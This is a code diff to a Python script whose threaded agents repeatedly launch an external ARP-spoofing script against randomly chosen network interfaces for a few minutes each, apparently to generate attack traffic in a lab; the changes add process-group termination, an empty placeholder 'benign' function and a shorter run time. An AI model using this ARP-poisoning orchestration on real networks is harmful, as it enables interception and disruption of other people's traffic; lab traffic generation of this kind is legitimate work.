@@ -3,6 +3,8 @@ import threading
 import random
 import time
 import sys
+import signal
+import os
 from datetime import datetime, timedelta
 
 INTERFACES = ['Melchior', 'Balthasar', 'Casper']
@@ -44,15 +46,17 @@ def execute_code(agent_id, target_interface): # ARP-poison script: https://githu
         # Generate a random duration between 2 to 4 minutes
         duration = random.uniform(2, 4)
         end_time = datetime.now() + timedelta(minutes=duration)
+        print(end_time)
 
 
-        command = [f'python3 arpspoof.py  --targetip {targetip} -i {agent_name} --attackermac {agent_interface_mac} --targetmac {targetmac} --gatewaymac DE:BC:50:A7:AD:9E -f']
-
+        command = [f'python3 arpspoof.py --targetip {targetip} -i {agent_name} --attackermac {agent_interface_mac} --targetmac {targetmac} --gatewaymac DE:BC:50:A7:AD:9E -f']
 
         try:
             print(f"Agent {agent_name} is running the following command: {' '.join(command)}")
             print(datetime.now())
-            process = subprocess.Popen(command, shell=True)
+            process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
+            #os.killpg(os.getpgid(process.pid),signal.SIGTERM)
+
         except subprocess.CalledProcessError as e:
             print(f"Agent {agent_name} failed to execute the command: {' '.join(command)}")
             print(f"Error: {e}")
@@ -62,16 +66,29 @@ def execute_code(agent_id, target_interface): # ARP-poison script: https://githu
         while True :
             if datetime.now() >= end_time:
                 print(f"Agent {agent_name} finished executing code on {target_interface}.")
-                process.kill()
+                os.killpg(os.getpgid(process.pid),signal.SIGTERM)
                 return
+
+def benign_arp_forger():
+    print("stuff")
+
+
 
 
 # Function to run an agent
 def run_agent(agent_id):
+    agent_name = INTERFACES[agent_id]
+    prev_target_interface = None
     while True:
-        # Introduce a random delay before starting each agent
-        random_start_delay = random.uniform(120, 240)  # Random delay between 2 to 4 minutes
-        time.sleep(random_start_delay)
+        duration = random.uniform(2, 4)
+        end_time = datetime.now() + timedelta(minutes=duration)
+
+        if prev_target_interface != None:
+            while True :
+                if datetime.now() >= end_time:
+                    benign_arp_forger
+                    print(f"Agent {agent_name} finished forgeing arp packets on {prev_target_interface}.")
+                    break
 
         # Choose a random target interface
         target_interface = random.choice(TARGET_INTERFACES)
@@ -85,6 +102,10 @@ def run_agent(agent_id):
         # Append the target interface back
         TARGET_INTERFACES.append(target_interface)
 
+        prev_target_interface = target_interface
+
+
+
 # Main function
 def main():
     # Create and start threads for each agent
@@ -96,10 +117,9 @@ def main():
 
     try:
         # Run the agents for an hour
-        time.sleep(60 * 60)
-        if time.sleep(60 * 60):
-            print("Time's up! Stopping agents...")
-            sys.exit()
+        time.sleep(60 * 10)
+        print("Time's up! Stopping agents...")
+        sys.exit()
     except KeyboardInterrupt:
         print("\nReceived KeyboardInterrupt. Stopping agents...")
         sys.exit()
